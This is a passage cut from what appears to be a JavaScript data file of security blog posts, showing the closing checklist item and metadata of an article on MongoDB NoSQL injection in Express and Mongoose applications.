- [ ] Log and alert on queries containing operators in user input`,
    date: "2026-02-26",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["mongodb", "nosql injection", "express", "mongoose", "database security", "injection", "node.js"],
    readTime: "14 min read",
  },
];
